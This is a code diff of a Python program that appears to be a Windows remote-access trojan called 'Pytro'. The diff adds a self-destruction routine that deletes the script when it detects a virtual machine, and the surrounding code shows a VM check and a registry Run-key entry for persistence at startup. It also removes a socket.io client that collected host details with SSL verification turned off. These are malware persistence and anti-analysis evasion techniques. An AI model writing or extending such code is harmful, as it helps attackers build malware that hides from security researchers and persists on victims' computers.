@@ -6,18 +6,8 @@ import sys
 import threading
 import winreg
 
-import socketio
-
 from media_utils import start_listener
 from network_utils import start_client
-
-sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
-
-system_info = {
-    'os': platform.system(),
-    'os_version': platform.version(),
-    'hostname': platform.node()
-}
 
 def check_vm():
     uname = platform.uname()
@@ -66,11 +56,17 @@ def add_to_startup(file_path=None):
     winreg.SetValueEx(key, 'Pytro', 0, winreg.REG_SZ, destination_file)
     winreg.CloseKey(key)
 
+def self_destruction():
+    try:
+        os.remove(sys.argv[0])
+        print("The script has been deleted successfully.")
+    except Exception as e:
+        print(f"Failed to delete the script: {e}")
 
 def main():
     if check_vm():
-        print("Running inside a Virtual Machine. Exiting...")
-        return
+        print("Running inside a Virtual Machine. Self-destruction initiated...")
+        self_destruction()
     else:
         print("Running on a physical machine.")
 
